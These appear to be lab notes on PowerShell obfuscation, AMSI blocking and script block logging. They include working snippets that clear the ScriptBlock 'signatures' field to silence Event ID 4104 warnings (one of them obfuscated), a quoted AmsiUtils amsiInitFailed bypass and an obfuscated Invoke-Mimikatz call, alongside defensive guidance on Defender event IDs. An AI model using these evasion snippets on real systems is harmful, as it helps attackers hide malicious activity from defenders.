### 18. Whitespace Obfuscation
- **Description**: Adds excessive whitespace, tabs, or newlines to make the script harder to read without changing functionality.
- **Example**:
  ```powershell
  $cmd      =      "Invoke-Mimikatz"
  &     $cmd
  ```
  - **Explanation**: Adds whitespace to obscure the script. Doesn’t evade AMSI but complicates manual analysis.

## Connection to our Context

- **AMSI Evasion**: Many of these techniques (e.g., concatenation, Base64, XOR) aim to evade AMSI’s detection of terms like `Invoke-Mimikatz` or `AmsiUtils`. However, your tests showed AMSI blocks `Invoke-Mimikatz` and `AmsiUtils` bypass attempts regardless of the `signatures` field, as AMSI uses `AmsiScanBuffer` and Defender’s signatures. Obfuscation may delay detection but often fails against modern AMSI, which normalizes and scans the final script block.
- **Script Block Logging**: Terms in `signatures` (e.g., `VirtualAlloc`, `Add-Type`) trigger Event ID 4104 warnings, as you observed. Obfuscating these terms (e.g., via concatenation or encoding) could prevent logging if the `signatures` field is intact, but clearing `signatures` (as you did) already stops these warnings. Obfuscation might further reduce logging visibility.
- **.NET Executables/IAT Hooking**: Obfuscation operates at the managed code level, like `signatures` or `AmsiUtils`, so it’s unrelated to IAT hooking, which is ineffective for .NET EXEs. Hooking `AmsiScanBuffer` could intercept obfuscated scripts during AMSI scanning.

## Effectiveness Against AMSI and Logging

- **AMSI**: Modern AMSI (as of May 2025) is robust, normalizing obfuscated scripts (e.g., decoding Base64, resolving concatenation) before scanning with `AmsiScanBuffer`. Your tests showed `Invoke-Mimikatz` and `AmsiUtils` bypasses are blocked, likely in Defender’s logs (Event IDs 1007, 1116, 1117).
- **Event ID 4104**: Obfuscating `signatures` terms (e.g., `VirtualAlloc` as `Virt` + `ualAlloc`) may prevent Event ID 4104 if the exact term isn’t matched, but clearing `signatures` already achieves this, as you observed.
- **Logs for AMSI Blocks**: AMSI-blocked scripts (e.g., `Invoke-Mimikatz`) don’t generate Event ID 4104 because they’re blocked pre-execution. Check `Microsoft-Windows-Windows Defender/Operational` for Event IDs 1116/1117.

**Check Defender Logs**:
   - Verify AMSI blocks for `Invoke-Mimikatz`:
     ```powershell
     Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterHashtable @{Id=1116} -MaxEvents 10
     ```




# POWERSHELL LOGGING (WARNINGS)

```powershell
write-host "VirtualAlloc"
write-host "Invoke-Mimikatz"

$result = [ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
$result.Count

$newHashSet = New-Object 'System.Collections.Generic.HashSet[string]'
[ScriptBlock].GetField('signatures', 'NonPublic, Static').SetValue($null, $newHashSet)

$result = [ScriptBlock].GetField('signatures', 'NonPublic, Static').GetValue($null)
$result.Count

write-host "VirtualAlloc"
write-host "Invoke-Mimikatz"
```

----

```powershell
[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
```
no more warnings = not even on the actual bypass (only informational logging)

----

Why No Event ID 4104 for Invoke-Mimikatz When AMSI Blocks It?
When you type Invoke-Mimikatz (or run Write-Output "Invoke-Mimikatz") and AMSI blocks it with the error This script contains malicious content and has been blocked by your antivirus software, you expect an Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log, but it’s missing. Here’s why:

AMSI Blocks Before Execution:
AMSI scans script blocks before they are executed by PowerShell. When AMSI (via Microsoft Defender) detects a malicious pattern like Invoke-Mimikatz, it blocks the script block immediately, preventing it from reaching the execution stage where Script Block Logging (Event ID 4104) would occur.
Event ID 4104 is generated when a script block is executed and contains terms from the signatures field (e.g., VirtualAlloc) or other logging triggers. Since Invoke-Mimikatz is blocked pre-execution, PowerShell never logs it as an executed script block.
Script Block Logging Scope:
Script Block Logging (Event ID 4104) captures script blocks that are successfully parsed and executed, even if they contain sensitive terms like VirtualAlloc. These terms, listed in the signatures field, trigger logging with a Warning level but don’t necessarily cause AMSI to block unless they match a malicious pattern.
For Invoke-Mimikatz, AMSI’s high-confidence detection (due to its association with the Mimikatz tool) halts the script block before PowerShell’s execution pipeline, bypassing the logging stage.
Why VirtualAlloc Generates Event ID 4104:
Unlike Invoke-Mimikatz, VirtualAlloc is a sensitive but not inherently malicious term. It’s included in the signatures field (as seen in your earlier output) and triggers Event ID 4104 warnings when used in a script block because:
The script block executes successfully (AMSI doesn’t block it).
PowerShell’s logging checks the signatures field and flags VirtualAlloc for logging.
Example:
powershell

Copy
Write-Output "VirtualAlloc"
This executes, and because VirtualAlloc is in signatures, PowerShell logs it as Event ID 4104 with a Warning level.
AMSI’s Preemptive Blocking:
AMSI uses AmsiScanBuffer (in amsi.dll) to scan script content during PowerShell’s parsing phase. If a script block contains a known malicious pattern (e.g., Invoke-Mimikatz or the AmsiUtils bypass), AMSI signals Defender to block it, raising a ParserError exception (ScriptContainedMaliciousContent) before execution or logging.
This explains why Invoke-Mimikatz and the AmsiUtils bypass ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)) were blocked without Event ID 4104 logs.

----
Where Are AMSI-Blocked Events Logged?
AMSI-blocked events (like Invoke-Mimikatz) are not logged as Event ID 4104 in the Microsoft-Windows-PowerShell/Operational log because they don’t reach execution. Instead, they are typically logged by Microsoft Defender in its own event logs. Here’s where to find them:

Microsoft Defender Event Logs:
Log Name: Microsoft-Windows-Windows Defender/Operational
Event IDs:
Event ID 1007: Indicates a malware scan result, including when AMSI blocks a script. This event may capture details about the blocked script block (e.g., Invoke-Mimikatz).
Event ID 1116: Indicates a malware detection, often used when Defender blocks a script or file based on AMSI’s input.
Event ID 1117: Indicates a malware action taken (e.g., blocking or quarantining the script).
